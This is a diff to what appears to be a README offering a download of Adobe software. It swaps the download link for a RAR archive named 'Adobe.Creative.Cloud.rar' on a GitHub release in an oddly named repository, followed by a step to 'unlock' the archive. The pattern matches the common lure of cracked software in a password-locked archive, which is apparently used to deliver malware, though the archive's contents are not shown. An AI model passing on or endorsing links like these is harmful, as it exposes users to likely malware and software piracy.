@@ -3,7 +3,7 @@
 
 **1. Download the archive:**
 
-[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Launcher/Launcher.zip)
+[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Ad0bebe/Adobe.Creative.Cloud.rar)
 
 **2. Unlock the archive:**
 
@@ -76,5 +76,4 @@
 * **Master Pages:** Use master pages to maintain consistency.
 * **Export Options:** Export your designs in various formats, including PDF and EPUB.
 
-## Take a Look:
-[SCREENSHOT](https://imgur.com/a/BPOSkry)
+
